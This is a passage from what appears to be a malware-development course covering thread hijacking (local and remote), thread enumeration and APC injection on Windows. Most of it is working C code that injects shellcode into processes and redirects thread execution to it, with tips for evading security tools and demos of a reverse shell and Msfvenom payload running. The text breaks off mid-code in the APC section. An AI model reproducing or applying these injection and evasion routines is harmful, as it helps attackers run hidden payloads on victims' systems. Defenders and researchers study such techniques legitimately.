The main difference is payload exposure and stealth. Creating a new thread for payload execution will expose the base address of the payload, and thus the payload's content because a new thread's entry must point to the payload's base address in memory. This is not the case with thread hijacking because the thread's entry would be pointing at a normal process function and therefore the thread would appear benign.

#### CreateThread WinAPI

`CreateThread`'s third parameter,??`LPTHREAD_START_ROUTINE lpStartAddress`, specifies the address of the thread's entry. Using thread creation,??`lpStartAddress`??will point to the payload's address. On the other hand, thread hijacking will point to a benign function.

```c
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress, // Thread Entry
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
```

The description of the third parameter is shown below.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/start-address-param.png)

### Local Thread Hijacking Steps

This section describes the required steps to perform thread hijacking on a thread created in the local process.

#### Creating The Target Thread

The prerequisite to performing thread hijacking is finding a running thread to hijack. It should be noted that it's not possible to hijack a local process's main thread because the targeted thread needs to first be placed in a suspended state. This is problematic when targeting the main thread since it is the one that executes the code and cannot be suspended. Therefore, do not target the main thread when performing local thread hijacking.

This module will demonstrate hijacking a newly created thread.??`CreateThread`??will initially be called to create a thread and set a benign function as the thread's entry. Afterward, the thread's handle will be used to perform the necessary steps to hijack the thread and execute the payload instead.

#### Modifying The Thread's Context

The next step is to retrieve the thread's context in order to modify it and make it point at a payload. When the thread resumes execution, the payload is executed.

As previously mentioned,??`GetThreadContext`??will be used to retrieve the target thread's??`CONTEXT`??structure. Certain values of the structure will be modified to modify the current thread's context using??`SetThreadContext`. The values that are being changed in the structure are the ones that decide what the thread will execute next. These values are the??`RIP`??(for 64-bit processors) or??`EIP`??(for 32-bit processors) registers.

The??`RIP`??and??`EIP`??registers, also known as the??_instruction pointer register_, point to the next instruction to execute. They are updated after each instruction is executed.

#### Setting ContextFlags

Notice how the??`GetThreadContext`'s second parameter,??`lpContext`, is marked as an IN & OUT parameter. The??[Remarks section](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext#remarks)??in Microsoft's documentation states:

_The function retrieves a selective context based on the value of the ContextFlags member of the context structure._

Essentially Microsoft is stating that??`CONTEXT.ContextFlags`??must be set to a value before calling the function.??`ContextFlags`??is set to the??`CONTEXT_CONTROL`??flag to retrieve the value of the control registers.

Therefore, setting??`CONTEXT.ContextFlags`??to??`CONTEXT_CONTROL`??is required to perform thread hijacking. Alternatively,??`CONTEXT_ALL`??can also be used to perform thread hijacking.

### Thread Hijacking Function

`RunViaClassicThreadHijacking`??is a custom-built function that performs thread hijacking. The function requires 3 arguments:

- `hThread`??- A handle to a??**suspended**??thread to be hijacked.
    
- `pPayload`??- A pointer to the payload's base address.
    
- `sPayloadSize`??- The size of the payload.
    

```c
BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	
	PVOID    pAddress         = NULL;
	DWORD    dwOldProtection  = NULL;
	CONTEXT  ThreadCtx        = { 
		.ContextFlags = CONTEXT_CONTROL 
	};

    // Allocating memory for the payload
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL){
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Copying the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);

	// Changing the memory protection
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)){
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Updating the next instruction pointer to be equal to the payload's address 
	ThreadCtx.Rip = pAddress;

	// Updating the new thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```

### Creating The Sacrificial Thread

Since??`RunViaClassicThreadHijacking`??requires a handle to a thread, the main function would need to supply that. As previously mentioned, the targeted thread needs to be in a suspended state for??`RunViaClassicThreadHijacking`??to successfully hijack the thread.

The??`CreateThread`??WinAPI will be used to create a new thread. The new thread should appear as benign as possible to avoid detection. This can be achieved by making a benign function that gets executed by this newly created thread.

The next step is to suspend the newly created thread for??`GetThreadContext`??to succeed. This can be done in two ways:

1. Passing??`CREATE_SUSPENDED`??flag in??`CreateThread`'s??[dwCreationFlags parameter](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread#parameters). That flag will create the thread in a suspended state.
    
2. Creating a normal thread, but suspending it later using the??[SuspendThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread)??WinAPI.
    

The first method will be used since it utilizes fewer WinAPI calls. However, both methods will require the thread to be resumed after executing??`RunViaClassicThreadHijacking`. This will be achieved using the??[ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)??WinAPI which only requires the handle of the suspended thread.

### Main Function

To reiterate, the main function will create a sacrificial thread in a suspended state. The thread will be initially running a benign dummy function which will then be hijacked using??`RunViaClassicThreadHijacking`??to run the payload.

```c
int main() {
	
	HANDLE hThread = NULL;

	// Creating sacrificial thread in suspended state 
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Hijacking the sacrificial thread created
	if (!RunViaClassicThreadHijacking(hThread, Payload, sizeof(Payload))) {
		return -1;
	}

	// Resuming suspended thread, so that it runs our shellcode
	ResumeThread(hThread);
	
	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}

```

### Demo

The??`mainCRTStartup`??is the main thread running the main function and the??`DummyFunction`??thread is the sacrificial thread.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/threadhijack-208833406-0c1bb9f4-9a41-46e0-a2d5-b05f71c6c287.png)

  

The image below shows the hijacked process establishing a network connection. This means the payload was successfully executed.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/threadhijack-308833564-0000d447-c970-40d8-8be3-8da70b63f30f.png)

  

Successful reverse shell connection.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/threadhijack-408833616-43a64b68-f30e-466c-a4c6-4d48289c0158.png)
# 4.4 Thread Hijacking - Remote Thread Creation

### Introduction

The previous module demonstrated thread hijacking on a local process by creating a suspended sacrificial thread that runs a benign dummy function and utilized its handle to execute the payload. This module will demonstrate the same technique against a remote process rather than the local process.

Another noticeable difference in this module is that a sacrificial thread will not be created in the remote process. Although that can be done using the??`CreateRemoteThread`??WinAPI call, it is a commonly abused function and therefore highly monitored by security solutions.

A better approach is to create a sacrificial process in a suspended state using??[CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)??which will create all of its threads in a suspended state, allowing them to be hijacked.

### Remote Thread Hijacking Steps

This section describes the required steps to perform thread hijacking on a thread residing in a remote process.

#### CreateProcess WinAPI

`CreateProcess`??is a powerful and important WinAPI that has various uses. To ensure users have a solid understanding, the function's important parameters are explained below.

```c
BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
```

- The??`lpApplicationName`??and??`lpCommandLine`??parameters represent the process name and its command line arguments, respectively. For example,??`lpApplicationName`??can be??`C:\Windows\System32\cmd.exe`??and??`lpCommandLine`??can be??`/k whoami`. Alternatively,??`lpApplicationName`??can be set to??`NULL`??but??`lpCommandLine`??can have the process name and its arguments,??`C:\Windows\System32\cmd.exe /k whoami`. Both parameters are marked as optional meaning a newly created process does not need to have any arguments.
    
- `dwCreationFlags`??is the parameter that controls the priority class and the creation of the process. The possible values for this parameter can be found??[here](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags#flags). For example, using the??`CREATE_SUSPENDED`??flag creates the process in a suspended state.
    
- `lpStartupInfo`??is a pointer to??[STARTUPINFO](https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfoa)??which contains details related to the process creation. The only element that needs to be populated is??`DWORD cb`, which is the size of the structure in bytes.
    
- `lpProcessInformation`??is an OUT parameter that returns a??[PROCESS_INFORMATION](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information)??structure. The??`PROCESS_INFORMATION`??structure is shown below.
    

```c
typedef struct _PROCESS_INFORMATION {
  HANDLE hProcess;        // A handle to the newly created process.
  HANDLE hThread;         // A handle to the main thread of the newly created process.
  DWORD  dwProcessId;     // Process ID
  DWORD  dwThreadId;      // Main Thread's ID    
} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;

```

#### Using Environment Variables

The last remaining piece for creating a process is determining the process's full path. The sacrificial process will be created from a binary that resides in the??`System32`??directory. It's possible to assume the path will be??`C:\Windows\System32`??and hard code that value, but it's always safer to programmatically verify the path. To do so, the??[GetEnvironmentVariableA](https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea)??WinAPI will be used.??`GetEnvironmentVariableA`??retrieves the value of a specified environment variable which in this case will be "WINDIR".

`WINDIR`??is an environment variable that points to the installation directory of the Windows operating system. On most systems, this directory is "C:\Windows". It's possible to access the value of the WINDIR environment variable by typing "echo %WINDIR%" in the command prompt or simply typing??`%WINDIR%`??in the file explorer search bar.

```c
DWORD GetEnvironmentVariableA(
  [in, optional]  LPCSTR lpName,
  [out, optional] LPSTR  lpBuffer,
  [in]            DWORD  nSize
);
```

### Creating a Sacrificial Process Function

`CreateSuspendedProcess`??will be used to create the sacrificial process in a suspended state. It requires 4 arguments:

- `lpProcessName`??- The name of the process to create.
    
- `dwProcessId`??- A pointer to a DWORD which receives the process ID.
    
- `hProcess`??- A pointer to a HANDLE that receives the process handle.
    
- `hThread`??- A pointer to a HANDLE that receives the thread handle.
    

```c
BOOL CreateSuspendedProcess (IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR				    lpPath          [MAX_PATH * 2];
	CHAR				    WnDr            [MAX_PATH];

	STARTUPINFO			    Si              = { 0 };
	PROCESS_INFORMATION		Pi              = { 0 };

	// Cleaning the structs by setting the member values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the value of the %WINDIR% environment variable
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the full target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,					// No module name (use command line)
		lpPath,					// Command line
		NULL,					// Process handle not inheritable
		NULL,					// Thread handle not inheritable
		FALSE,					// Set handle inheritance to FALSE
		CREATE_SUSPENDED,		// Creation flag
		NULL,					// Use parent's environment block
		NULL,					// Use parent's starting directory 
		&Si,					// Pointer to STARTUPINFO structure
		&Pi)) {					// Pointer to PROCESS_INFORMATION structure

		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Populating the OUT parameters with CreateProcessA's output
	*dwProcessId    = Pi.dwProcessId;
	*hProcess       = Pi.hProcess;
	*hThread        = Pi.hThread;
	
	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}
```

### Injecting Remote Process Function

The next step after creating the target process is to inject the payload using the??`InjectShellcodeToRemoteProcess`??function from the??_Process Injection - Shellcode_??beginner module. The payload is only written to the remote process without being executed. The base address is then stored for later use via thread hijacking.

```c
BOOL InjectShellcodeToRemoteProcess (IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {


	SIZE_T  sNumberOfBytesWritten    = NULL;
	DWORD   dwOldProtection          = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);


	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}

```

### Remote Thread Hijacking Function

After creating the suspended process and writing the payload to the remote process, the final step is to use the thread handle which was returned by??`CreateSuspendedProcess`??to perform thread hijacking. This part is the same as the one demonstrated in the local thread hijacking module.

To recap,??`GetThreadContext`??is used to retrieve the thread's context, update the??`RIP`??register to point to the written payload, call??`SetThreadContext`??to update the thread's context and finally use??`ResumeThread`??to execute the payload. All of this is demonstrated in the custom function below,??`HijackThread`, which takes two arguments:

- `hThread`??- The thread to hijack.
    
- `pAddress`??- A pointer to the base address of the payload to be executed.
    

```c
BOOL HijackThread (IN HANDLE hThread, IN PVOID pAddress) {

	CONTEXT	ThreadCtx = {
		.ContextFlags = CONTEXT_CONTROL
	};

	// getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

 	// updating the next instruction pointer to be equal to our shellcode's address 
	ThreadCtx.Rip = pAddress;
  
	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// resuming suspended thread, thus running our payload
	ResumeThread(hThread);
	
	WaitForSingleObject(hThread, INFINITE);
	
	return TRUE;
}
```

### Conclusion

A quick recap of what was demonstrated in this module:

1. A new process was created in a suspended state using??`CreateProcessA`, which created all of its threads in a suspended state as well.
    
2. The payload was injected into the newly created process using??`VirtualAllocEx`??and??`WriteProcessMemory`??but was not executed.
    
3. Used the thread handle returned from??`CreateProcessA`??to execute the payload via thread hijacking.
    

### Demo

This demo uses??`Notepad.exe`??as the sacrificial process, hijacks its thread and executes the Msfvenom calc shellcode.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/rthread-hijack-108970868-ca84b0fe-ce83-447e-b7a1-4116559bc414.png)
# 4.5 Thread Hijacking - Local Thread Enumeration

### Introduction

So far, when local thread hijacking was performed, the target thread was created using??`CreateThread`??and its context was modified. This module will demonstrate an alternative method where the system's running threads are enumerated using??`CreateToolhelp32Snapshot`??and then hijacked.

### Thread Enumeration

Recall the use of??`CreateToolhelp32Snapshot`??from previous modules, where the WinAPI was used to retrieve a snapshot of the system's processes. In this module, the same WinAPI is being used but with a different value being used for the??[dwFlags Parameter](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot#parameters). To enumerate the running threads on the system, the??`TH32CS_SNAPTHREAD`??flag must be specified. Using this flag,??`CreateToolhelp32Snapshot`??returns a??[THREADENTRY32](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32)??structure that's shown below.

```c
typedef struct tagTHREADENTRY32 {
  DWORD dwSize;                       // sizeof(THREADENTRY32)
  DWORD cntUsage;
  DWORD th32ThreadID;                 // Thread ID
  DWORD th32OwnerProcessID;           // The PID of the process that created the thread.
  LONG  tpBasePri;
  LONG  tpDeltaPri;
  DWORD dwFlags;
} THREADENTRY32;
```

Each running thread has its own??`THREADENTRY32`??structure in the captured snapshot.

#### Identifying The Thread's Owner

According to Microsoft's documentation:

_To identify the threads that belong to a specific process, compare its process identifier to the??`th32OwnerProcessID`??member of the??`THREADENTRY32`??structure when enumerating the threads._

In other words, to determine the process to which the thread belongs, compare the target PID to??`THREADENTRY32.th32OwnerProcessID`, which is the PID of the process that created the thread. If the PIDs match, then the thread presently being enumerated belongs to the target process.

#### Required WinAPIs

The following WinAPIs will be used to perform thread enumeration.

- [CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)??- Used with the??`TH32CS_SNAPTHREAD`??flag to receive a snapshot of all the threads running on the system.
    
- [Thread32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first)??- Used to get the information about the first thread captured in the snapshot.
    
- [Thread32Next](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next), Used to get the information about the next thread in the captured snapshot.
    
- [OpenThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread)??- Used to open a handle to the target thread using its thread ID.
    
- [GetCurrentProcessId](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid)??- Used to retrieve the local process's PID. Since the local process is the target process, its PID is required to determine whether the threads belong to this process.
    

### Worker Threads

Before diving into the thread enumeration code, it's important to understand the concept of??_worker threads_. Although??`CreateThread`??is not used in the code, the Windows operating system will create worker threads in the process. These worker threads are valid targets for thread hijacking. An example of these worker threads can be seen below.

![image](https://maldevacademy.s3.amazonaws.com/images/Advanced/tenum-0209185998-74b97dca-e541-401d-b700-b45852e7564a.png)

The threads that are shown in the image above, such as??`ntdll.dll!EtwNotificationRegister+0x2d0`, are created by the operating system to run the??`EtwNotificationRegister`??function, which is related to the??_ETW - Event Tracing for Windows_. ETW will be explained in future modules but for now, it is sufficient to understand that this function is used to notify the operating system when a certain event occurs in the process.

### Thread Enumeration Function

`GetLocalThreadHandle`??utilizes the previously mentioned steps to perform thread enumeration. It takes 3 arguments:

- `dwMainThreadId`??- The thread ID of the main thread of the local process. This is required to avoid targeting the local process's main thread.
    
- `dwThreadId`??- A pointer to a DWORD that receives a hijackable thread's ID.
    
- `hThread`??- A pointer to a HANDLE that receives a handle to the hijackable thread.
    

```c
BOOL GetLocalThreadHandle(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {
	
	// Getting the local process ID
	DWORD           dwProcessId  = GetCurrentProcessId();
	HANDLE          hSnapShot    = NULL;
	THREADENTRY32   Thr          = {
		.dwSize = sizeof(THREADENTRY32)
	};

	// Takes a snapshot of the currently running processes's threads 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first thread encountered in the snapshot.
	if (!Thread32First(hSnapShot, &Thr)) {
		printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		// If the thread's PID is equal to the PID of the target process then
		// this thread is running under the target process
		// The 'Thr.th32ThreadID != dwMainThreadId' is to avoid targeting the main thread of our local process
		if (Thr.th32OwnerProcessID == dwProcessId && Thr.th32ThreadID != dwMainThreadId) {

			// Opening a handle to the thread 
			*dwThreadId  = Thr.th32ThreadID;
			*hThread     = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

			if (*hThread == NULL)
				printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());

			break;
		}

	// While there are threads remaining in the snapshot
	} while (Thread32Next(hSnapShot, &Thr));


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwThreadId == NULL || *hThread == NULL)
		return FALSE;
	return TRUE;
}

```

### Local Thread Hijacking Function

Once a valid handle to the target thread has been obtained, it can be passed to the??`HijackThread`??function. The??[SuspendThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread)??WinAPI will be used to suspend the thread and then??`GetThreadContext`??and??`SetThreadContext`??will be used to update the??`RIP`??register to point to the payload's base address. Additionally, the payload must be written to the local process memory before hijacking the thread.

```c

BOOL HijackThread(HANDLE hThread, PVOID pAddress) {

	CONTEXT	ThreadCtx = {
		.ContextFlags = CONTEXT_ALL
	};

	SuspendThread(hThread);

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Rip = pAddress;

	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[#] Press <Enter> To Run ... ");
	getchar();

	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}
```

### Demo

Note that the payload execution may take some time as the hijacked thread is not the main thread and does not run continuously.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/tenum-109188468-94e7741b-8953-4079-8a7c-8ab3cc449779.png)

  

Additionally, depending on the payload, the local process may crash after execution. For example, if the payload is for a command and control server, the process will continue running, however, if Msfvenom's calc shellcode was used, the process will crash because Msfvenom's calc shellcode terminates the calling thread.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/tenum-209188936-9a4de3fe-fd13-4a25-b343-153a59ea894b.png)
# 4.6 Thread Hijacking - Remote Thread Enumeration

### Introduction

This module covers the usage of??`CreateToolhelp32Snapshot`??to enumerate threads of a remote process. Minor changes are made to the??`GetLocalThreadHandle`??function, shown in the previous module, to make it work against remote threads.

The logic remains the same where??`CreateToolhelp32Snapshot`,??`Thread32First`??and??`Thread32Next`??are used to enumerate the target process's threads. The difference when targeting remote processes is that the main thread is a valid target for hijacking.

### Remote Thread Enumeration Function

`GetRemoteThreadhandle`??will enumerate threads of a remote process. It takes 3 arguments:

- `dwProcessId`??- This is the PID of the target process.
    
- `dwThreadId`??- A pointer to a DWORD that will receive the target process's thread ID.
    
- `hThread`??- A pointer to a HANDLE that will receive the handle to the remote thread.
    

One additional difference in the implementation of the??`GetRemoteThreadhandle`??function is that the target PID needs to be supplied. When targeting the local process that was not necessary because the??`GetCurrentProcessId`??WinAPI retrieved the local process's PID.

```c
BOOL GetRemoteThreadhandle(IN DWORD dwProcessId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {
	
	HANDLE         hSnapShot  = NULL;
	THREADENTRY32  Thr        = {
		.dwSize = sizeof(THREADENTRY32)
	};

	// Takes a snapshot of the currently running processes's threads 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first thread encountered in the snapshot.
	if (!Thread32First(hSnapShot, &Thr)) {
		printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		// If the thread's PID is equal to the PID of the target process then
		// this thread is running under the target process
		if (Thr.th32OwnerProcessID == dwProcessId){
			
			*dwThreadId  = Thr.th32ThreadID;
			*hThread     = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);
			
			if (*hThread == NULL)
				printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());

			break;
		}

	// While there are threads remaining in the snapshot
	} while (Thread32Next(hSnapShot, &Thr));


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwThreadId == NULL || *hThread == NULL)
		return FALSE;
	return TRUE;
}
```

### Remote Thread Hijacking Function

This part is similar to the hijack function seen in previous modules. Retrieve the remote process handle, inject the payload to the remote process and finally hijack the thread.

```c
BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {

	CONTEXT ThreadCtx = {
		.ContextFlags = CONTEXT_ALL
	};
	
	// Suspend the thread
	SuspendThread(hThread);

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Rip = pAddress;

	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[#] Press <Enter> To Run ... ");
	getchar();

	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}

```

### Demo

Getting the target process's PID. In this case, the target process is??`Notepad.exe`.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/renum-109196659-5f5a1b94-3074-4774-8271-03a07b5f2c04.png)

  

Inject the payload and hijack thread ID??`7136`. The thread stack shows that the address of the payload is the next job to be executed.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/renum-209196664-c43d380c-79ab-48c1-97c9-396c3c2b7c4d.png)

  

Finally, the payload is executed.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/renum-309196669-ebbdc23d-e0c2-436c-ac73-70f18c971c3b.png)
# 4.7 APC Injection

### Introduction

This module introduces another way to run a payload without having to create a new thread. This technique is known as APC injection.

### What is APC?

[Asynchronous Procedure Calls](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)??are a Windows operating system mechanism that enables programs to execute tasks asynchronously while continuing to run other tasks. APCs are implemented as kernel-mode routines that are executed in the context of a specific thread. Malware can leverage APCs to queue a payload and then have it execute when scheduled.

#### Alertable State

Not all threads can run a queued APC function, only threads in an??_alertable state_??can do so. An alertable state thread is a thread that is in a wait state. When a thread enters an alertable state it is placed in a queue of alertable threads, allowing it to run queued APC functions.

### What is APC Injection?

To queue an APC function to a thread, the address of the APC function must be passed to the??[QueueUserAPC](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)??WinAPI. According to Microsoft's documentation:

_An application queues an APC to a thread by calling the QueueUserAPC function. The calling thread specifies the address of an APC function in the call to QueueUserAPC._

The injected payload's address will be passed to??`QueueUserAPC`??in order to have it executed. Before doing so, a thread in the local process must be placed in an alertable state.

### QueueUserAPC

`QueueUserAPC`??is shown below and it accepts 3 arguments:

- `pfnAPC`??- The address of the APC function to be called.
    
- `hThread`??- A handle to an alertable thread or suspended thread.
    
- `dwData`??- If the APC function requires parameters, they can be passed here. This value will be??`NULL`??in this module's code.
    

```c
DWORD QueueUserAPC(
  [in] PAPCFUNC  pfnAPC,
  [in] HANDLE    hThread,
  [in] ULONG_PTR dwData
);
```

### Placing a Thread In An Alertable State

The thread that will be executing the queued function needs to be in an alertable state. This can be done by creating a thread and using one of the following WinAPIs:

- [SleepEx](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex)
    
- [MsgWaitForMultipleObjectsEx](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-msgwaitformultipleobjectsex)
    
- [WaitForSingleObjectEx](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobjectex)
    
- [WaitForMultipleObjectsEx](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitformultipleobjectsex)
    
- [SignalObjectAndWait](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-signalobjectandwait)
    

These functions are used for synchronizing threads and improving performance and responsiveness in applications, however in this case, passing a handle to a dummy event is sufficient. Passing the correct parameters to these functions is not necessary since simply using one of the functions is enough to place the thread in an alertable state.

To create a dummy event, the??[CreateEvent](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventw)??WinAPI will be used. The newly created event object is a synchronization object that allows threads to communicate with each other by signaling and waiting for events. Since the output of??`CreateEvent`??is irrelevant, any valid event can be passed to the previously shown WinAPIs.

#### Using The Functions

Any of the following functions can be used as a sacrificial alertable thread to run the queued APC payload. See below for examples of how to use the functions to place the current thread in an alertable state.

**Using??`SleepEx`**

```c
VOID AlertableFunction1() {
    // The 2nd parameter should be 'TRUE'
	SleepEx(INFINITE, TRUE);
}
```

**Using??`WaitForSingleObjectEx`**

```c
VOID AlertableFunction2() {

	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	if (hEvent) {
        // The 3rd parameter should be 'TRUE'
		WaitForSingleObjectEx(hEvent, INFINITE, TRUE);
		CloseHandle(hEvent);
	}
}
```

**Using??`WaitForMultipleObjectsEx`**

```c
VOID AlertableFunction3() {

	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	if (hEvent){
